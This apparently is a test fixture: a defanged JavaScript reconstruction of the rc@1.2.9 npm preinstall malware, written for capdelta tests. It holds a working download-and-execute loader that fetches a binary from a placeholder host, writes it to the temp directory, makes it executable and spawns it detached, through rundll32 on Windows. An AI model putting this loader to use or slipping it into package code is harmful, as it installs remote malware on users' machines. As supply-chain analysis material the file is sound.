// DEFANGED RECONSTRUCTION of the rc@1.2.9 preinstall payload (November 2021),
// modeled on public incident analyses (see inventory.json). Synthetic, not the
// original artifact. Parsed by capdelta tests only. Nothing here is executed.
// Kept: platform branch, download from a hard-coded host, write, chmod, spawn.
// Omitted: the encoded DLL, the real host, and every real execution path.
// main is never called here; the original ran it when the hook loaded the file.
const https = require("node:https");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { spawn } = require("node:child_process");

const DOWNLOAD_URL = "https://cdn.example.invalid/rc/build.dll";

function save(response, target, next) {
  const chunks = [];
  response.on("data", (chunk) => chunks.push(chunk));
  response.on("end", () => {
    fs.writeFileSync(target, Buffer.concat(chunks), { mode: 0o700 });
    next(target);
  });
}

function launch(target) {
  if (process.platform === "win32") {
    spawn("rundll32.exe", [target, "DllRegisterServer"], {
      detached: true,
      stdio: "ignore",
    }).unref();
    return;
  }
  fs.chmodSync(target, 0o700);
  spawn(target, [], { detached: true, stdio: "ignore" }).unref();
}

function main() {
  const name = process.platform === "win32" ? "build.dll" : "build";
  const target = path.join(os.tmpdir(), name);
  https.get(DOWNLOAD_URL, (response) => save(response, target, launch));
}

module.exports = { main };
